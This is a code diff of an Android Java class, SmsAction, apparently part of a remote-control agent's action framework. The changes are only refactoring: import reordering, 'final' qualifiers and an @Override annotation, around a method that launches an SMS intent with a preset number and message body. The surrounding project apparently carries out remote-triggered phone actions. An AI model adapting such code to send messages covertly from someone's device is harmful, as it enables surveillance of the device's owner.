@@ -10,17 +10,16 @@ package com.ht.RCSAndroidGUI.action;
 
 import java.io.IOException;
 
+import android.content.Intent;
+import android.net.Uri;
+
 import com.ht.RCSAndroidGUI.Debug;
 import com.ht.RCSAndroidGUI.Device;
-import com.ht.RCSAndroidGUI.RCSAndroidGUI;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.utils.Check;
 import com.ht.RCSAndroidGUI.utils.DataBuffer;
 import com.ht.RCSAndroidGUI.utils.Utils;
 import com.ht.RCSAndroidGUI.utils.WChar;
-
-import android.content.Intent;
-import android.net.Uri;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -99,9 +98,9 @@ public class SmsAction extends SubAction {
 		return false;
 	}
 
-	private boolean sendSMS(String text) {
-		Uri smsUri = Uri.parse("tel:" + number);
-		Intent intent = new Intent(Intent.ACTION_VIEW, smsUri);
+	private boolean sendSMS(final String text) {
+		final Uri smsUri = Uri.parse("tel:" + number);
+		final Intent intent = new Intent(Intent.ACTION_VIEW, smsUri);
 		intent.putExtra("sms_body", text);
 		intent.setType("vnd.android-dir/mms-sms");
 		Status.getAppContext().startActivity(intent);
@@ -164,6 +163,7 @@ public class SmsAction extends SubAction {
 		return true;
 	}
 
+	@Override
 	public String toString() {
 		final StringBuffer sb = new StringBuffer();
 		sb.append("Sms type: " + type);
